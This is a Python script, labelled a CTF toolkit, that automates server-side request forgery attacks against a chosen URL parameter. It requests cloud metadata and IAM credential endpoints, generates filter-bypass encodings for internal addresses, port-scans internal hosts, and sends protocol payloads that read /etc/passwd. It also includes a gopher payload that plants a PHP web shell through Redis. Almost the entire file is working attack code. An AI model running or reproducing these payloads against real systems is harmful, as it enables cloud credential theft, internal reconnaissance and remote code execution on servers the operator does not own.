#!/usr/bin/env python3
"""
SSRF Tester — CTF Toolkit
Covers: cloud metadata, internal port scan, protocol wrappers, filter bypass
Usage: python3 ssrf_tester.py --url https://target.com --param url
"""
import requests, argparse, socket, ipaddress, concurrent.futures
from urllib.parse import urlparse

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})
session.max_redirects = 10

# ─── METADATA ENDPOINTS ───────────────────────────────────────────────────────

METADATA_TARGETS = {
    "aws":          "http://169.254.169.254/latest/meta-data/",
    "aws_token":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp":          "http://metadata.google.internal/computeMetadata/v1/",
    "azure":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "alibaba":      "http://100.100.100.200/latest/meta-data/",
    "digital_ocean":"http://169.254.169.254/metadata/v1/",
    "local":        "http://localhost/",
    "local_8080":   "http://localhost:8080/",
    "local_8443":   "https://localhost:8443/",
    "local_3000":   "http://localhost:3000/",
    "local_5000":   "http://localhost:5000/",
    "local_6379":   "http://localhost:6379/",  # Redis
    "local_27017":  "http://localhost:27017/",  # MongoDB
    "local_5432":   "http://localhost:5432/",   # Postgres
}

# ─── BYPASS TECHNIQUES ────────────────────────────────────────────────────────

def make_bypass_urls(base: str = "http://169.254.169.254/") -> list:
    """Generate SSRF filter bypass variants for a given URL."""
    bypassess = [
        # IP encoding
        "http://2130706433/",                    # 127.0.0.1 decimal
        "http://0x7f000001/",                    # hex
        "http://0177.0.0.1/",                    # octal
        "http://127.1/",                         # shortened
        "http://127.0.1/",
        "http://[::1]/",                         # IPv6 loopback
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        # DNS rebinding / resolves to 127
        "http://localtest.me/",
        "http://customer1.app.localhost.my.salesforce.com/",
        "http://spoofed.burpcollaborator.net/",
        # Proto bypass
        "http://0/",
        "http://0.0.0.0/",
        # Double URL encode
        "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/",
        # Slash bypass
        "http:///127.0.0.1/",
        "http://127.0.0.1/./",
        # Cloud metadata bypass encodings
        "http://169.254.169.254/",
        "http://169.254.169.254.nip.io/",
        "http://169%2e254%2e169%2e254/",
        "http://169.254.169.254%2f",
    ]
    return bypassess


def build_redirect_chain(listener: str, final: str) -> str:
    """Craft a URL that redirects through listener -> final (for redirect-based SSRF)."""
    return f"{listener}?redirect={requests.utils.quote(final, safe='')}"


# ─── INTERNAL PORT SCAN ───────────────────────────────────────────────────────

COMMON_PORTS = [21, 22, 25, 53, 80, 443, 3000, 3306, 3389, 4000, 5000,
                5432, 5900, 6379, 7001, 8000, 8080, 8443, 8888, 9200, 27017]

def ssrf_port_scan(url: str, param: str, host: str = "127.0.0.1",
                   ports: list = None) -> dict:
    """Use SSRF to probe internal ports — compare response size/time."""
    if ports is None:
        ports = COMMON_PORTS
    results = {}
    baseline_len = 0
    try:
        r = session.get(url, params={param: "http://192.0.2.1:9/"}, timeout=5)
        baseline_len = len(r.content)
    except Exception:
        pass

    def probe(port):
        target = f"http://{host}:{port}/"
        try:
            r = session.get(url, params={param: target}, timeout=5)
            return port, len(r.content), r.status_code
        except Exception:
            return port, -1, -1

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(probe, p): p for p in ports}
        for f in concurrent.futures.as_completed(futures):
            port, size, code = f.result()
            if size != baseline_len and size != -1:
                results[port] = {"size": size, "status": code, "diff": size - baseline_len}
                print(f"  [+] Port {port} OPEN (size={size}, status={code})")
    return results


# ─── PROTOCOL WRAPPERS ────────────────────────────────────────────────────────

PROTOCOL_PAYLOADS = {
    "file":    "file:///etc/passwd",
    "dict":    "dict://localhost:6379/info",
    "gopher_redis": (
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
        "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2420%0D%0A%0A%0A"
        "<?php system($_GET['cmd']); ?>%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig"
        "%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html"
        "%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0A"
        "dbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"
    ),
    "ldap":    "ldap://127.0.0.1:389/%20",
    "sftp":    "sftp://127.0.0.1/etc/passwd",
    "tftp":    "tftp://127.0.0.1/TESTUDPPACKET",
    "netdoc":  "netdoc:///etc/passwd",
}


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CTF SSRF Tester")
    parser.add_argument("--url",   required=True)
    parser.add_argument("--param", required=True, help="Parameter that takes a URL")
    parser.add_argument("--mode",
                        choices=["metadata","bypass","portscan","protos","all"],
                        default="all")
    parser.add_argument("--host",  default="127.0.0.1", help="Host to port scan")
    args = parser.parse_args()

    if args.mode in ("metadata", "all"):
        print("[*] Probing cloud metadata endpoints...")
        for name, target in METADATA_TARGETS.items():
            try:
                r = session.get(args.url, params={args.param: target},
                                timeout=8, headers={"Metadata": "true"})
                if len(r.text) > 20:
                    print(f"  [+] {name}: {r.status_code} ({len(r.text)} bytes)")
                    print(f"      {r.text[:200]}")
            except Exception:
                pass

    if args.mode in ("bypass", "all"):
        print("\n[*] Testing 127.0.0.1 filter bypass variants...")
        for bu in make_bypass_urls():
            try:
                r = session.get(args.url, params={args.param: bu}, timeout=5)
                if r.status_code != 400 and len(r.text) > 50:
                    print(f"  [+] {bu} → {r.status_code} ({len(r.text)} bytes)")
            except Exception:
                pass

    if args.mode in ("portscan", "all"):
        print(f"\n[*] SSRF port scan on {args.host}...")
        ssrf_port_scan(args.url, args.param, args.host)

    if args.mode in ("protos", "all"):
        print("\n[*] Testing protocol wrappers...")
        for proto, target in PROTOCOL_PAYLOADS.items():
            try:
                r = session.get(args.url, params={args.param: target}, timeout=8)
                if len(r.text) > 20:
                    print(f"  [+] {proto}: {r.status_code} ({len(r.text)} bytes)")
                    print(f"      {r.text[:200]}")
            except Exception:
                pass


if __name__ == "__main__":
    main()
